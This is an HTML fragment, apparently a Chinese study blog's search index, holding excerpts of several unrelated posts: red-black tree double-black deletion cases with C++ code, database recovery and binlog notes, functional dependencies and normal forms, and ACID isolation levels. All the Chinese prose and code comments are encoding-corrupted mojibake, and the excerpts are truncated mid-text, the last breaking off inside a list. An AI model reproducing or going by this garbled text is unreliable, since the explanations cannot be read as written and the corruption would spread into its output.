&lt;p&gt;æ­¤æ—¶æŒ‰ç…§å¯¹åº”Bæ ‘æ¥çœ‹ï¼Œå±äºä¸‹æº¢å‡ºä¸”å…„å¼Ÿä¸å¤Ÿå€Ÿï¼Œçˆ¶èŠ‚ç‚¹ä¹Ÿåªæœ‰ä¸€ä¸ªkeyçš„æƒ…æ™¯ã€‚&lt;br&gt;
æ­¤æ—¶çš„æ“ä½œæ–¹å¼ä¸å‰é¢ç±»ä¼¼ï¼Œéœ€è¦å°† s æŸ“çº¢ï¼Œp ä¿æŒé»‘è‰²ï¼Œè¿™æ—¶æŒ‰ç…§Bæ ‘æ¥çœ‹ï¼Œçˆ¶èŠ‚ç‚¹åªæœ‰ä¸€ä¸ªkeyï¼Œå€Ÿèµ°åä¼šå†ä¸€æ¬¡ä¸‹æº¢ï¼Œè¿™ä¹Ÿæ˜¯çº¢é»‘æ ‘åˆ é™¤æ—¶å”¯ä¸€éœ€è¦é€’å½’è°ƒæ•´çš„åœ°æ–¹ã€‚æ­¤æ—¶é€’å½’å‘ä¸Šæ—¶ï¼Œç›¸å½“äºè™šæ‹Ÿä¸€ä¸ªæ–°çš„ x èŠ‚ç‚¹æ›¿ä»£ p èŠ‚ç‚¹åŸæ¥çš„ä½ç½®ï¼ŒåŒæ—¶ä»¤å…¶å·¦å­æ ‘ä¸ºç©ºï¼Œå³å­©å­ä¸º pã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_8e4f0ad4d4b6523906db45720c63dcc5.png&#34; alt=&#34;å›¾ç‰‡.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;case4é»‘é»‘-çº¢ä¿®æ­£&#34;&gt;case4ï¼šé»‘é»‘-çº¢ä¿®æ­£&lt;/h2&gt;
&lt;p&gt;æœ€åä¸€ç§æƒ…å†µï¼Œè€ƒè™‘ s ä¸ºçº¢è‰²ï¼Œæ­¤æ—¶ s ä¸€å®šæœ‰ä¸¤ä¸ªé»‘å­©å­ï¼Œä¸” p ä¸€å®šä¸ºé»‘è‰²ï¼Œä»Bæ ‘çš„è§’åº¦è€ƒè™‘ï¼Œäº¤æ¢ s ä¸ p çš„é¢œè‰²å¯¹Bæ ‘æ²¡æœ‰ä»»ä½•å½±å“ï¼Œååº”åˆ°çº¢é»‘æ ‘ä¸Šï¼Œç›¸å½“äºä»¥ p ç‚¹ä¸ºè½´åšä¸€æ¬¡å·¦æ—‹ï¼ˆå¯¹ç§°çš„æƒ…æ™¯ä¸‹åšå³æ—‹ï¼‰ï¼Œå¹¶äº¤æ¢ s ä¸ p çš„é¢œè‰²ã€‚è¿™æ ·åšä¸èƒ½è§£å†³åŒé»‘ç¼ºé™·ï¼Œä½†æ˜¯è½¬æ¢åæœ‰ä¸€ä¸ªæ–°çš„å…„å¼Ÿ s&#39; ï¼Œä¸”ä¸€å®šæ˜¯é»‘è‰²ï¼Œå¹¶ä¸” p ä¸€å®šæ˜¯çº¢è‰²ï¼Œæ­¤æ—¶å°†å˜æˆ case1æˆ– case2ï¼Œå†è¿›è¡Œä¸€æ¬¡è°ƒæ•´å³å¯ã€‚&lt;br&gt;
case4çš„å¤„ç†å­˜åœ¨ä¸€äº›æŠ€å·§æ€§çš„æ“ä½œï¼Œä¸ªäººæƒ³ä¸åˆ°æ€ä¹ˆä»Bæ ‘çš„è§’åº¦æ¥çœ‹å¾…ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_cab86e9550f6ca82c71c469b10f887c5.png&#34; alt=&#34;å›¾ç‰‡.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;åŒé»‘ä¿®æ­£ä»£ç &#34;&gt;åŒé»‘ä¿®æ­£ä»£ç &lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;template &amp;lt;typename T&amp;gt; 
void RedBlack&amp;lt;T&amp;gt;::solveDoubleBlack ( BinNodePosi&amp;lt;T&amp;gt; r ) {
   BinNodePosi&amp;lt;T&amp;gt; p = r ? r-&amp;gt;parent : _hot; if ( !p ) return; //rçš„çˆ¶äº²
   BinNodePosi&amp;lt;T&amp;gt; s = ( r == p-&amp;gt;lc ) ? p-&amp;gt;rc : p-&amp;gt;lc; //rçš„å…„å¼Ÿ
   if ( IsBlack ( s ) ) { //å…„å¼Ÿsä¸ºé»‘
      BinNodePosi&amp;lt;T&amp;gt; t = NULL; //sçš„çº¢å­©å­ï¼ˆè‹¥å·¦ã€å³å­©å­çš†çº¢ï¼Œå·¦è€…ä¼˜å…ˆï¼›çš†é»‘æ—¶ä¸ºNULLï¼‰
      if ( IsRed ( s-&amp;gt;rc ) ) t = s-&amp;gt;rc; //å³å­
      if ( IsRed ( s-&amp;gt;lc ) ) t = s-&amp;gt;lc; //å·¦å­
      if ( t ) { // case1ï¼šé»‘é»‘-é»‘å¸¦çº¢
          RBColor oldColor = p-&amp;gt;color; //å¤‡ä»½åŸå­æ ‘æ ¹èŠ‚ç‚¹pé¢œè‰²ï¼Œå¹¶å¯¹tåŠå…¶çˆ¶äº²ã€ç¥–çˆ¶
      // ä»¥ä¸‹ï¼Œé€šè¿‡æ—‹è½¬é‡å¹³è¡¡ï¼Œå¹¶å°†æ–°å­æ ‘çš„å·¦ã€å³å­©å­æŸ“é»‘
         BinNodePosi&amp;lt;T&amp;gt; b = FromParentTo ( *p ) = rotateAt ( t ); //ä»¥tçš„çˆ·çˆ·ä¸ºæ€»è½´è¿›è¡Œ3-4æ—‹è½¬
         if ( HasLChild ( *b ) ) { b-&amp;gt;lc-&amp;gt;color = RB_BLACK; updateHeight ( b-&amp;gt;lc ); } //å·¦å­
         if ( HasRChild ( *b ) ) { b-&amp;gt;rc-&amp;gt;color = RB_BLACK; updateHeight ( b-&amp;gt;rc ); } //å³å­
         b-&amp;gt;color = oldColor; updateHeight ( b ); //æ–°å­æ ‘æ ¹èŠ‚ç‚¹ç»§æ‰¿åŸæ ¹èŠ‚ç‚¹çš„é¢œè‰²

      } else { //case2ã€3ï¼šé»‘é»‘-é»‘æ— çº¢å­©å­
         s-&amp;gt;color = RB_RED; s-&amp;gt;height--; //sè½¬çº¢
         if ( IsRed ( p ) ) { //case2ï¼špä¸ºçº¢
            p-&amp;gt;color = RB_BLACK; //pè½¬é»‘ï¼Œä½†é»‘é«˜åº¦ä¸å˜
         } else { //case3ï¼špä¸ºé»‘
            p-&amp;gt;height--; //pä¿æŒé»‘ï¼Œä½†é»‘é«˜åº¦ä¸‹é™
            solveDoubleBlack ( p ); //é€’å½’ä¸Šæº¯
         }
      }
   } else { //case4ï¼šé»‘é»‘-çº¢
      s-&amp;gt;color = RB_BLACK; p-&amp;gt;color = RB_RED; //sè½¬é»‘ï¼Œpè½¬çº¢
      BinNodePosi&amp;lt;T&amp;gt; t = IsLChild ( *s ) ? s-&amp;gt;lc : s-&amp;gt;rc; //å–tä¸å…¶çˆ¶såŒä¾§
      _hot = p; FromParentTo ( *p ) = rotateAt ( t ); //å¯¹tåŠå…¶çˆ¶äº²ã€ç¥–çˆ¶åšå¹³è¡¡è°ƒæ•´
      solveDoubleBlack ( r ); //ç»§ç»­ä¿®æ­£rå¤„åŒé»‘â€”â€”æ­¤æ—¶çš„på·²è½¬çº¢ï¼Œæ•…åç»­åªèƒ½æ˜¯BB-1æˆ–BB-2R
   }
}
&lt;/code&gt;&lt;/pre&gt;
">çº¢é»‘æ ‘</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_gledvl/"" data-c="
          &lt;h2 id=&#34;æ•°æ®è½¬å‚¨&#34;&gt;æ•°æ®è½¬å‚¨&lt;/h2&gt;
&lt;p&gt;ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯å¤‡ä»½ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æµ·é‡å…¨é‡è½¬å‚¨ä¸å¢é‡è½¬å‚¨&#34;&gt;æµ·é‡ï¼ˆå…¨é‡ï¼‰è½¬å‚¨ä¸å¢é‡è½¬å‚¨&lt;/h3&gt;
&lt;p&gt;å…¨é‡å°±æ˜¯å…¨å¤‡ä»½ï¼Œå¢é‡å°±æ˜¯å¢é‡å¤‡ä»½ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ—¥å¿—&#34;&gt;æ—¥å¿—&lt;/h2&gt;
&lt;p&gt;å¦‚MySqlçš„Binlogï¼Œå°±æ˜¯ä»¥è®°å½•ä¸ºå•ä½çš„æ—¥å¿—ï¼Œæ¯ä¸€ä¸ªäº‹åŠ¡éƒ½ä¼šè¢«è®°å½•ï¼ˆä¸ä¸€å®šåˆ·æ–°åˆ°ç£ç›˜ï¼Œ&lt;code&gt;sync_binlog&lt;/code&gt; çš„è®¾ç½®ç›¸å…³ï¼‰&lt;/p&gt;
">ã€Šæ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µã€‹--æ•°æ®åº“æ¢å¤æŠ€æœ¯</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_lh2wgf/"" data-c="
          &lt;h2 id=&#34;ä¸é”™çš„å‚è€ƒhttpswwwzhihucomquestion24696366&#34;&gt;ä¸é”™çš„å‚è€ƒ&lt;a href=&#34;https://www.zhihu.com/question/24696366&#34;&gt;https://www.zhihu.com/question/24696366&lt;/a&gt;&lt;/h2&gt;
&lt;h2 id=&#34;ç å’Œä¸»å±æ€§&#34;&gt;ç å’Œä¸»å±æ€§&lt;/h2&gt;
&lt;p&gt;è‹¥æœ‰Xï¼Œå±æ€§çš„å…¨é›†Uå®Œå…¨å‡½æ•°ä¾èµ–ä¸Xï¼Œåˆ™Xæ˜¯ä¸€ä¸ªç ã€‚&lt;br&gt;
å…¨éƒ¨ç çš„é›†åˆæ˜¯ä¸»å±æ€§ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å‡½æ•°ä¾èµ–&#34;&gt;å‡½æ•°ä¾èµ–&lt;/h2&gt;
&lt;p&gt;å¦‚æœå­˜åœ¨æ¨¡å¼ (A,B) ï¼Œåˆ™Aå¯ä»¥ä½œä¸ºä¸»é”®ï¼Œè¿™å°±æ˜¯å‡½æ•°ä¾èµ–ï¼Œå†™ä½œ&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_56e601e945c388147f033f31511faed5.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç§°ä½œBä¾èµ–äºAï¼Œæˆ–Aå‡½æ•°ç¡®å®šB&lt;/p&gt;
&lt;h2 id=&#34;1nfç¬¬ä¸€èŒƒå¼&#34;&gt;1NFï¼Œç¬¬ä¸€èŒƒå¼&lt;/h2&gt;
&lt;p&gt;å¦‚æœä¸€ä¸ªå…³ç³»æ¨¡å¼Rçš„å…¨éƒ¨å±æ€§éƒ½æ˜¯åŸå­çš„ã€ä¸å¯å†åˆ†çš„ï¼Œé‚£ä¹ˆå®ƒæ»¡è¶³ç¬¬ä¸€èŒƒå¼ã€‚&lt;br&gt;
å¯¹äºå…³ç³»courseä¸­çš„å±æ€§course_idï¼Œæˆ‘ä»¬å¯èƒ½ä¼šä½¿ç”¨CS-101è¿™æ ·çš„è¯¾ç¨‹æ ‡è¯†å·ï¼Œå…¶ä¸­CSä»£è¡¨ç³»ï¼Œå¦‚æœåœ¨åº”ç”¨ç¨‹åºä¸­é€šè¿‡é¢å¤–çš„ç¼–ç¨‹å°†CSè§£æä¸ºè®¡ç®—æœºç³»ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºcourse_idå±æ€§å¯ä»¥å†åˆ†ï¼Œä¸æ˜¯åŸå­çš„ã€‚&lt;br&gt;
ä½†æ˜¯å¦‚æœå•ç‹¬å­˜å‚¨dept_nameå±æ€§ï¼Œé‚£ä¹ˆç³»åå°±ä¸ä»course_idä¸­è§£æï¼Œå¯ä»¥è®¤ä¸ºå…¶æ˜¯åŸå­çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªå…³ç³»æ¨¡å¼ç¬¦åˆç¬¬ä¸€èŒƒå¼ã€‚&lt;/p&gt;
&lt;h2 id=&#34;2nf&#34;&gt;2NF&lt;/h2&gt;
&lt;p&gt;æ¶ˆé™¤éä¸»å±æ€§å¯¹ç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–&lt;/p&gt;
&lt;h2 id=&#34;ä½¿ç”¨å‡½æ•°ä¾èµ–è¿›è¡Œåˆ†è§£&#34;&gt;ä½¿ç”¨å‡½æ•°ä¾èµ–è¿›è¡Œåˆ†è§£&lt;/h2&gt;
&lt;h3 id=&#34;ç å’Œå‡½æ•°ä¾èµ–&#34;&gt;ç å’Œå‡½æ•°ä¾èµ–&lt;/h3&gt;
&lt;p&gt;å…³ç³»æ¨¡å¼rï¼ˆRï¼‰ï¼ŒræŒ‡å…³ç³»ï¼ŒRæŒ‡å…³ç³»ä¸­çš„å…¨éƒ¨å±æ€§ã€‚&lt;br&gt;
&lt;strong&gt;è¶…ç &lt;/strong&gt;Â ï¼š è®¾å…³ç³»æ¨¡å¼r(R)ï¼ŒRçš„å­é›†Kï¼Œå¯¹äºrçš„å®ä¾‹ä¸­çš„å…¨éƒ¨å…ƒç»„å¯¹t1ä¸t2ï¼Œè‹¥ t1!=t2ï¼Œåˆ™æœ‰t1[K] != t2[K]ï¼Œé‚£ä¹ˆKæ˜¯å…³ç³»rçš„è¶…ç ã€‚&lt;br&gt;
&lt;strong&gt;å‡½æ•°ä¾èµ–&lt;/strong&gt;Â ï¼š åœ¨å…³ç³»æ¨¡å¼rï¼ˆRï¼‰ä¸Šï¼Œ&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%871_1d9f00cfb0758e57cb9ab1daff04b6a9.png&#34; alt=&#34;å›¾ç‰‡1.png&#34; loading=&#34;lazy&#34;&gt;ï¼Œ&lt;br&gt;
1 rï¼ˆRï¼‰çš„å®ä¾‹å¯¹t1ä¸t2ï¼Œè‹¥t1[a]=t2[a]ï¼Œåˆ™t1[b]=t2[b]ï¼Œé‚£ä¹ˆæ»¡è¶³å‡½æ•°ä¾èµ–&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%871_dc5e1da00cc02926a9934f3470bcc99e.png&#34; alt=&#34;å›¾ç‰‡1.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
2 å¯¹äºrï¼ˆRï¼‰çš„æ¯ä¸ªåˆæ³•å®ä¾‹éƒ½æ»¡è¶³å‡½æ•°ä¾èµ–&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%871_dc5e1da00cc02926a9934f3470bcc99e.png&#34; alt=&#34;å›¾ç‰‡1.png&#34; loading=&#34;lazy&#34;&gt;ï¼Œé‚£ä¹ˆè¯¥å‡½æ•°ä¾èµ–åœ¨æ¨¡å¼rï¼ˆRï¼‰ä¸Šæˆç«‹ã€‚&lt;br&gt;
è‹¥K-&amp;gt;Råœ¨å…³ç³»æ¨¡å¼rï¼ˆRï¼‰ä¸Šæˆç«‹ï¼Œé‚£ä¹ˆKæ˜¯ä¸€ä¸ªè¶…ç ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_e3c4d77f2396b3da30f690881bc6796e.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åœ¨ä¸Šå›¾ä¸­ï¼ŒA-&amp;gt;Cæ»¡è¶³å‡½æ•°ä¾èµ–ï¼Œè€ŒC-&amp;gt;Aä¸æ»¡è¶³ã€‚&lt;br&gt;
åœ¨æ‰€æœ‰å…³ç³»ä¸­éƒ½æ»¡è¶³çš„å‡½æ•°ä¾èµ–æ˜¯å¹³å‡¡çš„å‡½æ•°ä¾èµ–ã€‚ï¼ˆä¾‹å¦‚A-&amp;gt;Aï¼‰&lt;br&gt;
F+ç§°ä¸ºå‡½æ•°ä¾èµ–Fé›†åˆçš„é—­åŒ…ï¼Œå³Fé›†åˆå¯ä»¥æ¨å¯¼å‡ºçš„æ‰€æœ‰å‡½æ•°ä¾èµ–çš„é›†åˆã€‚&lt;/p&gt;
&lt;h3 id=&#34;bcnf&#34;&gt;BCNF&lt;/h3&gt;
&lt;p&gt;å¯¹äºF+ä¸­æ‰€æœ‰çš„å‡½æ•°ä¾èµ–a-&amp;gt;b,è‡³å°‘æ»¡è¶³ä¸‹é¢ä¸€é¡¹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a-&amp;gt;bæ˜¯å¹³å‡¡çš„å‡½æ•°ä¾èµ–ã€‚&lt;/li&gt;
&lt;li&gt;aæ˜¯æ¨¡å¼Rçš„ä¸€ä¸ªè¶…ç ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åˆ™æ»¡è¶³BCNF&lt;/p&gt;
&lt;h4 id=&#34;åˆ†è§£ä¸å±äºbcnfçš„æ¨¡å¼&#34;&gt;åˆ†è§£ä¸å±äºBCNFçš„æ¨¡å¼&lt;/h4&gt;
&lt;p&gt;åœ¨å…³ç³»æ¨¡å¼rï¼ˆRï¼‰ä¸­å­˜åœ¨è‡³å°‘ä¸€ä¸ªéå¹³å‡¡çš„å‡½æ•°ä¾èµ–a-&amp;gt;bï¼Œä¸”aä¸æ˜¯Rçš„è¶…ç ï¼Œåˆ™ç”¨ä»¥ä¸‹ä¸¤ä¸ªæ¨¡å¼å–ä»£Rï¼š&lt;br&gt;
1Â &lt;img src=&#34;http://static.yulan.net.cn/image/image_6dc7315535b996db34fd6bd1ad1ad351.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
2 &lt;img src=&#34;http://static.yulan.net.cn/image/image_3781bb947709648dabd4a52eec7cf656.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;3nfç¬¬ä¸‰èŒƒå¼&#34;&gt;3NFï¼Œç¬¬ä¸‰èŒƒå¼&lt;/h2&gt;
&lt;p&gt;ä¸€ç§æ¯”BCNFå¼±çš„èŒƒå¼ï¼Œåœ¨BCNFçš„åŸºç¡€ä¸Šå…è®¸ä¿æŒå‡½æ•°ä¾èµ–ã€‚&lt;br&gt;
&lt;strong&gt;3NFæ¶ˆé™¤äº†ä¼ é€’å‡½æ•°ä¾èµ–ã€‚BCNFåœ¨3NFçš„åŸºç¡€ä¸Šæ¶ˆé™¤äº†ä¸»å±æ€§å¯¹äºç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;å…¸å‹æ¡ˆä¾‹å¤šå¯¹å¤šå¯¹ä¸€å­¦å·-qqå·-å§“åå‡è®¾ä¸€ä¸ªå­¦ç”Ÿåªèƒ½æœ‰ä¸€ä¸ªqqå·&#34;&gt;å…¸å‹æ¡ˆä¾‹ï¼šå¤šå¯¹å¤šå¯¹ä¸€ï¼šå­¦å·ã€qqå·ã€å§“åï¼ˆå‡è®¾ä¸€ä¸ªå­¦ç”Ÿåªèƒ½æœ‰ä¸€ä¸ªqqå·ï¼‰&lt;/h4&gt;
&lt;p&gt;åœ¨BCNFçš„åŸºç¡€ä¸Šï¼Œå…è®¸&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a-&amp;gt;bæ˜¯å¹³å‡¡çš„å‡½æ•°ä¾èµ–Â ã€‚ Â Â ï¼ˆBCNFï¼‰&lt;/li&gt;
&lt;li&gt;aæ˜¯æ¨¡å¼Rçš„ä¸€ä¸ªè¶…ç ã€‚Â  Â Â Â  Â Â ï¼ˆBCNFï¼‰&lt;/li&gt;
&lt;li&gt;b - a ä¸­çš„æ¯ä¸ªå±æ€§Aéƒ½åŒ…å«äºRçš„ä¸€ä¸ªå€™é€‰ç ä¸­ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;å‡½æ•°ä¾èµ–ç†è®º&#34;&gt;å‡½æ•°ä¾èµ–ç†è®º&lt;/h2&gt;
&lt;h3 id=&#34;å‡½æ•°ä¾èµ–é›†çš„é—­åŒ…&#34;&gt;å‡½æ•°ä¾èµ–é›†çš„é—­åŒ…&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;é€»è¾‘è•´å«&lt;/strong&gt;Â ï¼šè‹¥æ¯ä¸€ä¸ªæ»¡è¶³å‡½æ•°ä¾èµ–Fçš„å®ä¾‹ä¹Ÿæ»¡è¶³fï¼Œåˆ™Fé€»è¾‘è•´å«fã€‚&lt;br&gt;
F+ç§°ä¸ºå‡½æ•°ä¾èµ–Fé›†åˆçš„é—­åŒ…ï¼Œå³Fé›†åˆå¯ä»¥æ¨å¯¼å‡ºçš„æ‰€æœ‰å‡½æ•°ä¾èµ–çš„é›†åˆã€‚&lt;br&gt;
&lt;strong&gt;Armstrongå…¬ç†&lt;/strong&gt;Â &lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_8eb5fa4942ec5b3de0d4fbe9ead8ccfc.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;å±æ€§é›†çš„é—­åŒ…&#34;&gt;å±æ€§é›†çš„é—­åŒ…&lt;/h3&gt;
&lt;p&gt;è®¾aä¸ºä¸€ä¸ªå±æ€§é›†ï¼Œåˆ™åœ¨å‡½æ•°ä¾èµ–Fä¸‹è¢«aå‡½æ•°ç¡®å®šçš„å±æ€§çš„é›†åˆï¼Œç§°ä¸ºaçš„é—­åŒ…ï¼Œè®°ä½œa+ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ­£åˆ™è¦†ç›–&#34;&gt;æ­£åˆ™è¦†ç›–&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;æ— å…³å±æ€§&lt;/strong&gt;Â &lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_e48ae77b7f5d496cf68a5dc4ed4797ef.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;strong&gt;æ­£åˆ™è¦†ç›–&lt;/strong&gt;Â &lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_c261dc58f5be1d8659624a92a2686ae8.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;æ— æŸåˆ†è§£&#34;&gt;æ— æŸåˆ†è§£&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/image_49ae2f623f318ee5cf3d228f9b7d7945.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_6ccb6e08840e6bdf4bb5652cfb08fecb.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ä¿æŒä¾èµ–&#34;&gt;ä¿æŒä¾èµ–&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/image_a4b51c7274dea744638d19dbfe235fcd.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç®—æ³•æ²¡çœ‹æ‡‚ã€‚&lt;br&gt;
BCNFèŒƒå¼å¯èƒ½å‡ºç°æ— æ³•ä¿æŒä¾èµ–çš„æƒ…å†µï¼Œ3NFå…è®¸äº†ä¿æŒä¾èµ–ã€‚&lt;/p&gt;
&lt;h2 id=&#34;4nf&#34;&gt;4NF&lt;/h2&gt;
&lt;h3 id=&#34;å¤šå€¼ä¾èµ–&#34;&gt;å¤šå€¼ä¾èµ–&lt;/h3&gt;
">ã€Šæ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µã€‹--ç¬¬å…«ç« </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_qiosri/"" data-c="
          &lt;h2 id=&#34;acid&#34;&gt;ACID&lt;/h2&gt;
&lt;p&gt;äº‹åŠ¡å…·æœ‰4ä¸ªç‰¹å¾ï¼Œåˆ†åˆ«æ˜¯åŸå­æ€§ã€ä¸€è‡´æ€§ã€éš”ç¦»æ€§å’ŒæŒä¹…æ€§ï¼Œç®€ç§°äº‹åŠ¡çš„ACIDç‰¹æ€§ï¼›&lt;/p&gt;
&lt;h3 id=&#34;ä¸€-åŸå­æ€§atomicity&#34;&gt;ä¸€ã€åŸå­æ€§ï¼ˆatomicity)&lt;/h3&gt;
&lt;p&gt;ä¸€ä¸ªäº‹åŠ¡è¦ä¹ˆå…¨éƒ¨æäº¤æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥å›æ»šï¼Œä¸èƒ½åªæ‰§è¡Œå…¶ä¸­çš„ä¸€éƒ¨åˆ†æ“ä½œï¼Œè¿™å°±æ˜¯äº‹åŠ¡çš„åŸå­æ€§ã€‚&lt;/p&gt;
&lt;h3 id=&#34;äºŒ-ä¸€è‡´æ€§consistency&#34;&gt;äºŒã€ä¸€è‡´æ€§ï¼ˆconsistency)&lt;/h3&gt;
&lt;p&gt;äº‹åŠ¡çš„æ‰§è¡Œä¸èƒ½ç ´åæ•°æ®åº“æ•°æ®çš„å®Œæ•´æ€§å’Œä¸€è‡´æ€§ï¼Œä¸€ä¸ªäº‹åŠ¡åœ¨æ‰§è¡Œä¹‹å‰å’Œæ‰§è¡Œä¹‹åï¼Œæ•°æ®åº“éƒ½å¿…é¡»å¤„äºä¸€è‡´æ€§çŠ¶æ€ã€‚&lt;br&gt;
ä¾‹å¦‚åœ¨ä¸€æ¬¡è½¬è´¦äº‹åŠ¡ä¸­ï¼Œä½™é¢çš„æ€»å’Œä¸èƒ½æ”¹å˜ï¼Œè¿™å°±æ˜¯ä¸€è‡´æ€§ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¸‰-éš”ç¦»æ€§isolation&#34;&gt;ä¸‰ã€éš”ç¦»æ€§ï¼ˆisolationï¼‰&lt;/h3&gt;
&lt;p&gt;äº‹åŠ¡çš„éš”ç¦»æ€§æ˜¯æŒ‡åœ¨å¹¶å‘ç¯å¢ƒä¸­ï¼Œå¹¶å‘çš„äº‹åŠ¡æ—¶ç›¸äº’éš”ç¦»çš„ï¼Œä¸€ä¸ªäº‹åŠ¡çš„æ‰§è¡Œä¸èƒ½ä¸è¢«å…¶ä»–äº‹åŠ¡å¹²æ‰°ã€‚ä¸åŒçš„äº‹åŠ¡å¹¶å‘æ“ä½œç›¸åŒçš„æ•°æ®æ—¶ï¼Œæ¯ä¸ªäº‹åŠ¡éƒ½æœ‰å„è‡ªå®Œæˆçš„æ•°æ®ç©ºé—´ï¼Œå³ä¸€ä¸ªäº‹åŠ¡å†…éƒ¨çš„æ“ä½œåŠä½¿ç”¨çš„æ•°æ®å¯¹å…¶ä»–å¹¶å‘äº‹åŠ¡æ—¶éš”ç¦»çš„ï¼Œå¹¶å‘æ‰§è¡Œçš„å„ä¸ªäº‹åŠ¡ä¹‹é—´ä¸èƒ½ç›¸äº’å¹²æ‰°ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨æ ‡å‡†SQLè§„èŒƒä¸­ï¼Œå®šä¹‰äº†4ä¸ªäº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œä¸åŒçš„éš”ç¦»çº§åˆ«å¯¹äº‹åŠ¡çš„å¤„ç†ä¸åŒï¼Œåˆ†åˆ«æ˜¯ï¼šæœªæˆæƒè¯»å–ï¼Œæˆæƒè¯»å–ï¼Œå¯é‡å¤è¯»å–å’Œä¸²è¡ŒåŒ–&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;è¯»æœªæäº¤ï¼ˆRead Uncommitedï¼‰ã€‚è¯¥éš”ç¦»çº§åˆ«å…è®¸è„è¯»å–ï¼Œå…¶éš”ç¦»çº§åˆ«æœ€ä½ï¼›æ¯”å¦‚äº‹åŠ¡Aå’Œäº‹åŠ¡BåŒæ—¶è¿›è¡Œï¼Œäº‹åŠ¡Aåœ¨æ•´ä¸ªæ‰§è¡Œé˜¶æ®µï¼Œä¼šå°†æŸæ•°æ®çš„å€¼ä»1å¼€å§‹ä¸€ç›´åŠ åˆ°10ï¼Œç„¶åè¿›è¡Œäº‹åŠ¡æäº¤ï¼Œæ­¤æ—¶ï¼Œäº‹åŠ¡Bèƒ½å¤Ÿçœ‹åˆ°è¿™ä¸ªæ•°æ®é¡¹åœ¨äº‹åŠ¡Aæ“ä½œè¿‡ç¨‹ä¸­çš„æ‰€æœ‰ä¸­é—´å€¼ï¼ˆå¦‚1å˜æˆ2ï¼Œ2å˜æˆ3ç­‰ï¼‰ï¼Œè€Œå¯¹è¿™ä¸€ç³»åˆ—çš„ä¸­é—´å€¼çš„è¯»å–å°±æ˜¯æœªæˆæƒè¯»å–ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
